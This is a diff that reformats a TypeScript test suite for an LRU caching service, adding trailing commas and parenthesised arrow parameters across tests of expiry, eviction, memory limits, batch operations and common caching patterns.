@@ -23,8 +23,8 @@ vi.mock('../../../src/utils/logger', () => ({
     info: vi.fn(),
     warn: vi.fn(),
     error: vi.fn(),
-    debug: vi.fn()
-  }
+    debug: vi.fn(),
+  },
 }));
 
 // Mock performance monitoring
@@ -36,8 +36,8 @@ const mockPerformanceMonitor = {
   getMetrics: vi.fn().mockReturnValue({
     averageHitRate: 0,
     totalOperations: 0,
-    memoryUsage: 0
-  })
+    memoryUsage: 0,
+  }),
 };
 
 // Mock distributed cache nodes for distributed caching tests
@@ -56,7 +56,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       maxSize: 100,
       maxMemoryBytes: 10 * 1024 * 1024, // 10MB
       ttlMs: 5000, // 5 seconds
-      cleanupIntervalMs: 1000 // 1 second
+      cleanupIntervalMs: 1000, // 1 second
     });
 
     searchCache = CacheFactory.createSearchCache(50);
@@ -146,7 +146,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
     it('should return all keys in order', () => {
       const keys = ['key-3', 'key-1', 'key-2'];
 
-      keys.forEach(key => cache.set(key, `value-${key}`));
+      keys.forEach((key) => cache.set(key, `value-${key}`));
 
       // Access key-1 to make it most recent
       cache.get('key-1');
@@ -163,7 +163,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       const shortTtlCache = new LRUCache<string, any>({
         maxSize: 10,
         maxMemoryBytes: 1024,
-        ttlMs: 100 // 100ms TTL
+        ttlMs: 100, // 100ms TTL
       });
 
       shortTtlCache.set('test-key', 'test-value');
@@ -172,7 +172,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       expect(shortTtlCache.get('test-key')).toBe('test-value');
 
       // Wait for expiration
-      await new Promise(resolve => setTimeout(resolve, 150));
+      await new Promise((resolve) => setTimeout(resolve, 150));
 
       // Should be expired
       expect(shortTtlCache.get('test-key')).toBeUndefined();
@@ -184,14 +184,14 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       const longTtlCache = new LRUCache<string, any>({
         maxSize: 10,
         maxMemoryBytes: 1024,
-        ttlMs: 50 // 50ms default TTL
+        ttlMs: 50, // 50ms default TTL
       });
 
       // Set item with longer TTL
       longTtlCache.set('long-ttl-key', 'value', 500); // 500ms TTL
 
       // Wait past default TTL but before item TTL
-      await new Promise(resolve => setTimeout(resolve, 100));
+      await new Promise((resolve) => setTimeout(resolve, 100));
 
       // Should still be available due to longer item TTL
       expect(longTtlCache.get('long-ttl-key')).toBe('value');
@@ -203,13 +203,13 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       const cache = new LRUCache<string, any>({
         maxSize: 10,
         maxMemoryBytes: 1024,
-        ttlMs: 50
+        ttlMs: 50,
       });
 
       cache.set('expire-test', 'value');
 
       // Wait for expiration
-      await new Promise(resolve => setTimeout(resolve, 75));
+      await new Promise((resolve) => setTimeout(resolve, 75));
 
       // Should trigger expiration on access
       expect(cache.has('expire-test')).toBe(false);
@@ -221,7 +221,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
     it('should not expire items without TTL', () => {
       const noTtlCache = new LRUCache<string, any>({
         maxSize: 10,
-        maxMemoryBytes: 1024
+        maxMemoryBytes: 1024,
         // No default TTL
       });
 
@@ -239,7 +239,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
         maxSize: 10,
         maxMemoryBytes: 1024,
         ttlMs: 100,
-        cleanupIntervalMs: 200 // Cleanup every 200ms
+        cleanupIntervalMs: 200, // Cleanup every 200ms
       });
 
       // Add items that will expire
@@ -250,7 +250,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       expect(cleanupCache.getStats().itemCount).toBe(5);
 
       // Wait for cleanup interval + TTL
-      await new Promise(resolve => setTimeout(resolve, 350));
+      await new Promise((resolve) => setTimeout(resolve, 350));
 
       // Should have cleaned up expired items
       expect(cleanupCache.getStats().itemCount).toBe(0);
@@ -263,7 +263,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       const manualCleanupCache = new LRUCache<string, any>({
         maxSize: 10,
         maxMemoryBytes: 1024,
-        ttlMs: 1 // Very short TTL
+        ttlMs: 1, // Very short TTL
       });
 
       // Add items
@@ -287,7 +287,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
     it('should evict least recently used items when size limit is reached', () => {
       const smallCache = new LRUCache<string, any>({
         maxSize: 3,
-        maxMemoryBytes: 1024
+        maxMemoryBytes: 1024,
       });
 
       smallCache.set('key-1', 'value-1');
@@ -311,7 +311,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
     it('should update recency on access', () => {
       const cache = new LRUCache<string, any>({
         maxSize: 3,
-        maxMemoryBytes: 1024
+        maxMemoryBytes: 1024,
       });
 
       cache.set('A', 'value-A');
@@ -335,7 +335,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
     it('should update recency on set for existing keys', () => {
       const cache = new LRUCache<string, any>({
         maxSize: 3,
-        maxMemoryBytes: 1024
+        maxMemoryBytes: 1024,
       });
 
       cache.set('A', 'value-A');
@@ -357,7 +357,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
     it('should track eviction statistics', () => {
       const cache = new LRUCache<string, any>({
         maxSize: 2,
-        maxMemoryBytes: 1024
+        maxMemoryBytes: 1024,
       });
 
       cache.set('evict-1', 'value-1');
@@ -382,7 +382,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
         { value: 42, expectedSize: 8 }, // number
         { value: true, expectedSize: 4 }, // boolean
         { value: null, expectedSize: 0 },
-        { value: undefined, expectedSize: 0 }
+        { value: undefined, expectedSize: 0 },
       ];
 
       testCases.forEach(({ value, expectedSize }) => {
@@ -400,13 +400,13 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
         data: {
           nested: {
             values: [1, 2, 3, 4, 5],
-            text: 'Some longer text content here'
-          }
+            text: 'Some longer text content here',
+          },
         },
         metadata: {
           created: new Date(),
-          tags: ['tag1', 'tag2', 'tag3']
-        }
+          tags: ['tag1', 'tag2', 'tag3'],
+        },
       };
 
       cache.set('complex-object', complexObject);
@@ -419,7 +419,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
     it('should evict items when memory limit is exceeded', () => {
       const cache = new LRUCache<string, any>({
         maxSize: 100,
-        maxMemoryBytes: 100 // Very small memory limit
+        maxMemoryBytes: 100, // Very small memory limit
       });
 
       // Add items that will exceed memory limit
@@ -437,7 +437,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
     it('should reject items larger than memory limit', () => {
       const cache = new LRUCache<string, any>({
         maxSize: 10,
-        maxMemoryBytes: 50 // Very small limit
+        maxMemoryBytes: 50, // Very small limit
       });
 
       const hugeValue = 'x'.repeat(100); // ~200 bytes
@@ -459,7 +459,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
             return value.length * 10; // 10 bytes per array item
           }
           return 50; // Default size
-        }
+        },
       });
 
       customCache.set('array', [1, 2, 3, 4, 5]); // Should be 50 bytes
@@ -522,26 +522,27 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       for (let i = 0; i < batchSize; i++) {
         items.push({
           key: `batch-${i}`,
-          value: { id: i, data: `data-${i}` }
+          value: { id: i, data: `data-${i}` },
         });
       }
 
       // Batch set
-      items.forEach(item => cache.set(item.key, item.value));
+      items.forEach((item) => cache.set(item.key, item.value));
 
       expect(cache.getStats().itemCount).toBe(batchSize);
 
       // Batch get
-      const retrieved = items.map(item => ({
+      const retrieved = items.map((item) => ({
         key: item.key,
-        value: cache.get(item.key)
+        value: cache.get(item.key),
       }));
 
-      expect(retrieved.every(r => r.value !== undefined)).toBe(true);
+      expect(retrieved.every((r) => r.value !== undefined)).toBe(true);
 
       // Batch delete
-      const deletedCount = items.reduce((count, item) =>
-        count + (cache.delete(item.key) ? 1 : 0), 0
+      const deletedCount = items.reduce(
+        (count, item) => count + (cache.delete(item.key) ? 1 : 0),
+        0
       );
 
       expect(deletedCount).toBe(batchSize);
@@ -552,21 +553,21 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       const warmCache = new LRUCache<string, any>({
         maxSize: 50,
         maxMemoryBytes: 1024,
-        ttlMs: 60000 // Long TTL for warming
+        ttlMs: 60000, // Long TTL for warming
       });
 
       // Simulate cache warming with frequently accessed items
       const frequentItems = [
         { key: 'user:1', value: { id: 1, name: 'User 1' } },
         { key: 'config:app', value: { version: '1.0', settings: {} } },
-        { key: 'cache:warm', value: { status: 'warmed' } }
+        { key: 'cache:warm', value: { status: 'warmed' } },
       ];
 
       // Warm cache
-      frequentItems.forEach(item => warmCache.set(item.key, item.value));
+      frequentItems.forEach((item) => warmCache.set(item.key, item.value));
 
       // Verify warmed items are immediately available
-      frequentItems.forEach(item => {
+      frequentItems.forEach((item) => {
         expect(warmCache.get(item.key)).toEqual(item.value);
       });
 
@@ -579,12 +580,12 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
     it('should handle cache preloading efficiently', () => {
       const preloadData = Array.from({ length: 50 }, (_, i) => ({
         key: `preload-${i}`,
-        value: { data: `value-${i}`, index: i }
+        value: { data: `value-${i}`, index: i },
       }));
 
       // Preload cache
       const preloadStart = Date.now();
-      preloadData.forEach(item => cache.set(item.key, item.value));
+      preloadData.forEach((item) => cache.set(item.key, item.value));
       const preloadTime = Date.now() - preloadStart;
 
       // Verify all items loaded
@@ -592,7 +593,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       expect(preloadTime).toBeLessThan(100); // Should be fast
 
       // Verify access after preload
-      preloadData.forEach(item => {
+      preloadData.forEach((item) => {
         expect(cache.get(item.key)).toEqual(item.value);
       });
 
@@ -636,7 +637,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       const sessionData = {
         userId: 'user123',
         sessionId: 'sess456',
-        preferences: { theme: 'dark', language: 'en' }
+        preferences: { theme: 'dark', language: 'en' },
       };
 
       sessionCache.set('session:user123', sessionData);
@@ -652,7 +653,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       const configData = {
         api: { endpoint: 'https://api.example.com', timeout: 5000 },
         features: { featureA: true, featureB: false },
-        limits: { maxItems: 1000, maxMemory: 1024 }
+        limits: { maxItems: 1000, maxMemory: 1024 },
       };
 
       configCache.set('app:config', configData);
@@ -729,7 +730,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
     it('should monitor eviction patterns', () => {
       const smallCache = new LRUCache<string, any>({
         maxSize: 3,
-        maxMemoryBytes: 1024
+        maxMemoryBytes: 1024,
       });
 
       // Add items beyond capacity to trigger evictions
@@ -749,10 +750,10 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       const accessPatterns = [
         { key: 'popular', frequency: 50 },
         { key: 'moderate', frequency: 20 },
-        { key: 'rare', frequency: 5 }
+        { key: 'rare', frequency: 5 },
       ];
 
-      accessPatterns.forEach(pattern => {
+      accessPatterns.forEach((pattern) => {
         cache.set(pattern.key, `value-${pattern.key}`);
 
         // Simulate access frequency
@@ -780,7 +781,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
         { operation: 'store', data: { id: 'mem2', content: 'Memory content 2' } },
         { operation: 'find', query: 'content' },
         { operation: 'find', query: 'content' }, // Should hit cache
-        { operation: 'store', data: { id: 'mem3', content: 'Memory content 3' } }
+        { operation: 'store', data: { id: 'mem3', content: 'Memory content 3' } },
       ];
 
       // Cache memory store results
@@ -809,10 +810,10 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
         'another query',
         'test query', // Duplicate - should hit cache
         'unique query',
-        'another query' // Duplicate - should hit cache
+        'another query', // Duplicate - should hit cache
       ];
 
-      searchQueries.forEach(query => {
+      searchQueries.forEach((query) => {
         const cacheKey = `search:${query}`;
         let results = searchCache.get(cacheKey);
 
@@ -822,7 +823,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
             query,
             results: [`Result 1 for ${query}`, `Result 2 for ${query}`],
             total: 2,
-            timestamp: Date.now()
+            timestamp: Date.now(),
           };
           searchCache.set(cacheKey, results);
         }
@@ -842,10 +843,10 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
         { type: 'email', value: 'invalid-email' },
         { type: 'phone', value: '+1234567890' },
         { type: 'email', value: 'test@example.com' }, // Duplicate
-        { type: 'phone', value: '+1234567890' } // Duplicate
+        { type: 'phone', value: '+1234567890' }, // Duplicate
       ];
 
-      validationCases.forEach(testCase => {
+      validationCases.forEach((testCase) => {
         const cacheKey = `validation:${testCase.type}:${testCase.value}`;
         let result = cache.get(cacheKey);
 
@@ -855,7 +856,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
             type: testCase.type,
             value: testCase.value,
             isValid: testCase.value.includes('@') || testCase.value.includes('+'),
-            timestamp: Date.now()
+            timestamp: Date.now(),
           };
           cache.set(cacheKey, result);
         }
@@ -871,7 +872,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
     it('should integrate with metadata caching', () => {
       const metadataTypes = ['entity', 'relation', 'decision', 'observation'];
 
-      metadataTypes.forEach(type => {
+      metadataTypes.forEach((type) => {
         const cacheKey = `metadata:${type}:schema`;
         let schema = configCache.get(cacheKey);
 
@@ -881,7 +882,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
             type,
             fields: ['id', 'created_at', 'data', 'tags'],
             required: ['id', 'created_at'],
-            indexes: ['tags', 'created_at']
+            indexes: ['tags', 'created_at'],
           };
           configCache.set(cacheKey, schema);
         }
@@ -900,18 +901,18 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
     it('should handle batch set operations efficiently', () => {
       const batchData = Array.from({ length: 100 }, (_, i) => ({
         key: `batch-set-${i}`,
-        value: { index: i, data: `batch-data-${i}` }
+        value: { index: i, data: `batch-data-${i}` },
       }));
 
       const startTime = Date.now();
-      batchData.forEach(item => cache.set(item.key, item.value));
+      batchData.forEach((item) => cache.set(item.key, item.value));
       const batchTime = Date.now() - startTime;
 
       expect(cache.getStats().itemCount).toBe(100);
       expect(batchTime).toBeLessThan(100); // Should be efficient
 
       // Verify all items are accessible
-      batchData.forEach(item => {
+      batchData.forEach((item) => {
         expect(cache.get(item.key)).toEqual(item.value);
       });
     });
@@ -919,29 +920,30 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
     it('should handle batch get operations efficiently', () => {
       // Pre-populate cache
       const keys = Array.from({ length: 50 }, (_, i) => `batch-get-${i}`);
-      keys.forEach(key => cache.set(key, `value-${key}`));
+      keys.forEach((key) => cache.set(key, `value-${key}`));
 
       // Batch get
       const startTime = Date.now();
-      const results = keys.map(key => cache.get(key));
+      const results = keys.map((key) => cache.get(key));
       const batchTime = Date.now() - startTime;
 
       expect(batchTime).toBeLessThan(50); // Should be very fast
-      expect(results.every(r => r !== undefined)).toBe(true);
+      expect(results.every((r) => r !== undefined)).toBe(true);
       expect(cache.getStats().totalHits).toBe(50);
     });
 
     it('should handle batch delete operations efficiently', () => {
       // Pre-populate cache
       const deleteKeys = Array.from({ length: 30 }, (_, i) => `batch-delete-${i}`);
-      deleteKeys.forEach(key => cache.set(key, `value-${key}`));
+      deleteKeys.forEach((key) => cache.set(key, `value-${key}`));
 
       const initialCount = cache.getStats().itemCount;
 
       // Batch delete
       const startTime = Date.now();
-      const deletedCount = deleteKeys.reduce((count, key) =>
-        count + (cache.delete(key) ? 1 : 0), 0
+      const deletedCount = deleteKeys.reduce(
+        (count, key) => count + (cache.delete(key) ? 1 : 0),
+        0
       );
       const batchTime = Date.now() - startTime;
 
@@ -950,7 +952,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       expect(batchTime).toBeLessThan(50); // Should be efficient
 
       // Verify items are deleted
-      deleteKeys.forEach(key => {
+      deleteKeys.forEach((key) => {
         expect(cache.get(key)).toBeUndefined();
       });
     });
@@ -967,7 +969,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
         { type: 'get', key: 'mixed-2' }, // Should be hit
       ];
 
-      operations.forEach(op => {
+      operations.forEach((op) => {
         switch (op.type) {
           case 'set':
             cache.set(op.key, op.value);
@@ -1022,10 +1024,10 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
         'key with spaces',
         'key-with-unicode-🚀',
         'key\nwith\nnewlines',
-        'key\twith\ttabs'
+        'key\twith\ttabs',
       ];
 
-      specialKeys.forEach(key => {
+      specialKeys.forEach((key) => {
         cache.set(key, `value-for-${key}`);
         expect(cache.get(key)).toBe(`value-for-${key}`);
       });
@@ -1037,7 +1039,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       for (let i = 0; i < 10; i++) {
         const tempCache = new LRUCache<string, any>({
           maxSize: 10,
-          maxMemoryBytes: 1024
+          maxMemoryBytes: 1024,
         });
 
         tempCache.set(`temp-${i}`, `value-${i}`);
@@ -1078,7 +1080,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       const zeroTtlCache = new LRUCache<string, any>({
         maxSize: 10,
         maxMemoryBytes: 1024,
-        ttlMs: 0 // Zero TTL
+        ttlMs: 0, // Zero TTL
       });
 
       zeroTtlCache.set('zero-ttl', 'value');
@@ -1103,7 +1105,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       const results = await Promise.all(concurrentOperations);
 
       expect(results).toHaveLength(100);
-      expect(results.every(r => r !== undefined)).toBe(true);
+      expect(results.every((r) => r !== undefined)).toBe(true);
 
       const stats = cache.getStats();
       expect(stats.itemCount).toBeLessThanOrEqual(10); // Only 10 unique keys
@@ -1112,7 +1114,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
     it('should handle memory pressure scenarios', () => {
       const pressureCache = new LRUCache<string, any>({
         maxSize: 5,
-        maxMemoryBytes: 100 // Very small limit
+        maxMemoryBytes: 100, // Very small limit
       });
 
       // Add items that will cause pressure
@@ -1132,7 +1134,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
         maxSize: 10,
         maxMemoryBytes: 1024,
         ttlMs: 50,
-        cleanupIntervalMs: 25 // Very frequent cleanup
+        cleanupIntervalMs: 25, // Very frequent cleanup
       });
 
       // Add and access items rapidly
@@ -1140,7 +1142,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
         cleanupCache.set(`cleanup-edge-${i}`, `value-${i}`);
 
         // Small delay to allow cleanup timer to run
-        await new Promise(resolve => setTimeout(resolve, 10));
+        await new Promise((resolve) => setTimeout(resolve, 10));
 
         cleanupCache.get(`cleanup-edge-${i}`);
       }
@@ -1192,7 +1194,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       const warmCache = new LRUCache<string, any>({
         maxSize: 20,
         maxMemoryBytes: 2048,
-        ttlMs: 30000 // Long TTL for warming
+        ttlMs: 30000, // Long TTL for warming
       });
 
       // Define frequently accessed data
@@ -1200,14 +1202,14 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
         { key: 'config:app', value: { name: 'Test App', version: '1.0' } },
         { key: 'user:current', value: { id: 123, name: 'Current User' } },
         { key: 'permissions:123', value: ['read', 'write', 'admin'] },
-        { key: 'cache:stats', value: { hits: 100, misses: 20 } }
+        { key: 'cache:stats', value: { hits: 100, misses: 20 } },
       ];
 
       // Warm cache
-      warmData.forEach(item => warmCache.set(item.key, item.value));
+      warmData.forEach((item) => warmCache.set(item.key, item.value));
 
       // Verify warmed data is immediately available
-      warmData.forEach(item => {
+      warmData.forEach((item) => {
         const start = Date.now();
         const result = warmCache.get(item.key);
         const duration = Date.now() - start;
@@ -1227,23 +1229,23 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       const accessPatterns = {
         'popular:1': { frequency: 10, lastAccess: Date.now() - 1000 },
         'popular:2': { frequency: 8, lastAccess: Date.now() - 2000 },
-        'rare:1': { frequency: 1, lastAccess: Date.now() - 10000 }
+        'rare:1': { frequency: 1, lastAccess: Date.now() - 10000 },
       };
 
       const preloadCache = new LRUCache<string, any>({
         maxSize: 10,
-        maxMemoryBytes: 1024
+        maxMemoryBytes: 1024,
       });
 
       // Preload based on access patterns
       Object.entries(accessPatterns)
-        .sort(([,a], [,b]) => b.frequency - a.frequency) // Sort by frequency
+        .sort(([, a], [, b]) => b.frequency - a.frequency) // Sort by frequency
         .slice(0, 5) // Take top 5
         .forEach(([key, pattern]) => {
           preloadCache.set(key, {
             data: `Data for ${key}`,
             accessFrequency: pattern.frequency,
-            lastAccess: pattern.lastAccess
+            lastAccess: pattern.lastAccess,
           });
         });
 
@@ -1259,7 +1261,11 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       // Different caches for different data types
       const userCache = new LRUCache<string, any>({ maxSize: 100, maxMemoryBytes: 1024 });
       const configCache = new LRUCache<string, any>({ maxSize: 50, maxMemoryBytes: 512 });
-      const tempCache = new LRUCache<string, any>({ maxSize: 200, maxMemoryBytes: 2048, ttlMs: 5000 });
+      const tempCache = new LRUCache<string, any>({
+        maxSize: 200,
+        maxMemoryBytes: 2048,
+        ttlMs: 5000,
+      });
 
       // Store different types in appropriate caches
       userCache.set('user:123', { id: 123, name: 'John Doe' });
@@ -1287,7 +1293,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
     it('should track cache operation performance', () => {
       const performanceCache = new LRUCache<string, any>({
         maxSize: 100,
-        maxMemoryBytes: 1024
+        maxMemoryBytes: 1024,
       });
 
       const operationTimes: number[] = [];
@@ -1309,7 +1315,9 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       // Analyze performance
       const avgTime = operationTimes.reduce((sum, time) => sum + time, 0) / operationTimes.length;
       const maxTime = Math.max(...operationTimes);
-      const p95Time = operationTimes.sort((a, b) => a - b)[Math.floor(operationTimes.length * 0.95)];
+      const p95Time = operationTimes.sort((a, b) => a - b)[
+        Math.floor(operationTimes.length * 0.95)
+      ];
 
       expect(avgTime).toBeLessThan(10); // Average should be very fast
       expect(maxTime).toBeLessThan(50); // Even slow operations should be fast
@@ -1321,14 +1329,15 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
     it('should monitor memory usage patterns', () => {
       const memoryCache = new LRUCache<string, any>({
         maxSize: 50,
-        maxMemoryBytes: 2048
+        maxMemoryBytes: 2048,
       });
 
       const memorySnapshots: number[] = [];
 
       // Add items and track memory
-      for (let i = 0; i < 60; i++) { // Exceed capacity
-        memoryCache.set(`memory-${i}`, `x`.repeat(20 * (i % 10 + 1)));
+      for (let i = 0; i < 60; i++) {
+        // Exceed capacity
+        memoryCache.set(`memory-${i}`, `x`.repeat(20 * ((i % 10) + 1)));
         memorySnapshots.push(memoryCache.getStats().memoryUsageBytes);
       }
 
@@ -1345,7 +1354,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
     it('should track hit rate optimization', () => {
       const hitRateCache = new LRUCache<string, any>({
         maxSize: 20,
-        maxMemoryBytes: 1024
+        maxMemoryBytes: 1024,
       });
 
       // Simulate realistic access pattern (80/20 rule)
@@ -1353,15 +1362,16 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       const unpopularItems = Array.from({ length: 16 }, (_, i) => `unpopular-${i}`);
 
       // Initialize cache
-      [...popularItems, ...unpopularItems].forEach(item =>
+      [...popularItems, ...unpopularItems].forEach((item) =>
         hitRateCache.set(item, `value-${item}`)
       );
 
       // Simulate access pattern
       for (let i = 0; i < 100; i++) {
-        const item = Math.random() < 0.8
-          ? popularItems[Math.floor(Math.random() * popularItems.length)]
-          : unpopularItems[Math.floor(Math.random() * unpopularItems.length)];
+        const item =
+          Math.random() < 0.8
+            ? popularItems[Math.floor(Math.random() * popularItems.length)]
+            : unpopularItems[Math.floor(Math.random() * unpopularItems.length)];
 
         hitRateCache.get(item);
       }
@@ -1378,7 +1388,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
     it('should identify performance bottlenecks', () => {
       const bottleneckCache = new LRUCache<string, any>({
         maxSize: 10,
-        maxMemoryBytes: 512
+        maxMemoryBytes: 512,
       });
 
       // Simulate operations that might cause bottlenecks
@@ -1401,10 +1411,10 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
           for (let i = 0; i < 20; i++) {
             bottleneckCache.set(`evict-${i}`, `value-${i}`);
           }
-        }
+        },
       ];
 
-      const performanceMetrics = bottleneckScenarios.map(scenario => {
+      const performanceMetrics = bottleneckScenarios.map((scenario) => {
         const start = Date.now();
         scenario();
         return Date.now() - start;
@@ -1425,7 +1435,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       const stressCache = new LRUCache<string, any>({
         maxSize: 1000,
         maxMemoryBytes: 10 * 1024 * 1024, // 10MB
-        ttlMs: 30000
+        ttlMs: 30000,
       });
 
       const operations = 10000;
@@ -1469,13 +1479,13 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       const pressureCache = new LRUCache<string, any>({
         maxSize: 100,
         maxMemoryBytes: 1024, // 1KB limit - very small
-        ttlMs: 1000
+        ttlMs: 1000,
       });
 
       // Add items that will definitely exceed memory limit
       const largeValues = Array.from({ length: 500 }, (_, i) => ({
         key: `pressure-${i}`,
-        value: 'x'.repeat(100) // 100 bytes each
+        value: 'x'.repeat(100), // 100 bytes each
       }));
 
       largeValues.forEach(({ key, value }) => {
@@ -1497,7 +1507,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       const concurrentCache = new LRUCache<string, any>({
         maxSize: 500,
         maxMemoryBytes: 5 * 1024 * 1024, // 5MB
-        ttlMs: 60000
+        ttlMs: 60000,
       });
 
       const concurrentOperations = 20;
@@ -1525,7 +1535,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
 
       // All operations should succeed
       workerResults.forEach((results, workerId) => {
-        expect(results.every(r => r === true)).toBe(true);
+        expect(results.every((r) => r === true)).toBe(true);
         expect(results).toHaveLength(operationsPerWorker);
       });
 
@@ -1541,7 +1551,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
         maxSize: 200,
         maxMemoryBytes: 2 * 1024 * 1024, // 2MB
         ttlMs: 30000,
-        cleanupIntervalMs: 5000
+        cleanupIntervalMs: 5000,
       });
 
       const duration = 5000; // 5 seconds of sustained load
@@ -1573,13 +1583,16 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
         operationMetrics.push(Date.now() - operationStart);
 
         // Small delay to prevent 100% CPU
-        await new Promise(resolve => setTimeout(resolve, 1));
+        await new Promise((resolve) => setTimeout(resolve, 1));
       }
 
       // Analyze performance degradation
-      const avgOperationTime = operationMetrics.reduce((sum, time) => sum + time, 0) / operationMetrics.length;
+      const avgOperationTime =
+        operationMetrics.reduce((sum, time) => sum + time, 0) / operationMetrics.length;
       const maxOperationTime = Math.max(...operationMetrics);
-      const p95OperationTime = operationMetrics.sort((a, b) => a - b)[Math.floor(operationMetrics.length * 0.95)];
+      const p95OperationTime = operationMetrics.sort((a, b) => a - b)[
+        Math.floor(operationMetrics.length * 0.95)
+      ];
 
       expect(avgOperationTime).toBeLessThan(5); // Average should be very fast
       expect(maxOperationTime).toBeLessThan(50); // Even slow operations should be reasonable
@@ -1594,7 +1607,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
     it('should implement cache-aside pattern', () => {
       const cacheAsideCache = new LRUCache<string, any>({
         maxSize: 50,
-        maxMemoryBytes: 1024
+        maxMemoryBytes: 1024,
       });
 
       // Simulate database
@@ -1636,7 +1649,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
     it('should implement write-through pattern', () => {
       const writeThroughCache = new LRUCache<string, any>({
         maxSize: 50,
-        maxMemoryBytes: 1024
+        maxMemoryBytes: 1024,
       });
 
       // Simulate database
@@ -1667,8 +1680,16 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       expect(getUser('2')).toEqual({ id: 2, name: 'Jane', email: 'jane@example.com' });
 
       // Should also be in database
-      expect(mockDatabase.get('user:1')).toEqual({ id: 1, name: 'John', email: 'john@example.com' });
-      expect(mockDatabase.get('user:2')).toEqual({ id: 2, name: 'Jane', email: 'jane@example.com' });
+      expect(mockDatabase.get('user:1')).toEqual({
+        id: 1,
+        name: 'John',
+        email: 'john@example.com',
+      });
+      expect(mockDatabase.get('user:2')).toEqual({
+        id: 2,
+        name: 'Jane',
+        email: 'jane@example.com',
+      });
 
       writeThroughCache.destroy();
     });
@@ -1676,12 +1697,12 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
     it('should implement write-behind pattern', async () => {
       const writeBehindCache = new LRUCache<string, any>({
         maxSize: 50,
-        maxMemoryBytes: 1024
+        maxMemoryBytes: 1024,
       });
 
       // Simulate database with delay
       const mockDatabase = new Map<string, any>();
-      const writeQueue: Array<{ key: string, value: any }> = [];
+      const writeQueue: Array<{ key: string; value: any }> = [];
 
       // Simulate async database writes
       const flushWriteQueue = async () => {
@@ -1689,7 +1710,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
           const { key, value } = writeQueue.shift()!;
           mockDatabase.set(key, value);
           // Simulate database write delay
-          await new Promise(resolve => setTimeout(resolve, 10));
+          await new Promise((resolve) => setTimeout(resolve, 10));
         }
       };
 
@@ -1734,7 +1755,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       const refreshAheadCache = new LRUCache<string, any>({
         maxSize: 20,
         maxMemoryBytes: 1024,
-        ttlMs: 2000 // 2 seconds TTL
+        ttlMs: 2000, // 2 seconds TTL
       });
 
       // Simulate database
@@ -1788,7 +1809,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       expect(dbCallCount).toBe(initialDbCalls + 1); // No additional DB call
 
       // Wait for refresh-ahead to potentially trigger
-      await new Promise(resolve => setTimeout(resolve, 2000));
+      await new Promise((resolve) => setTimeout(resolve, 2000));
 
       refreshAheadCache.destroy();
     });
@@ -1799,7 +1820,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
     it('should handle cache invalidation correctly', () => {
       const invalidationCache = new LRUCache<string, any>({
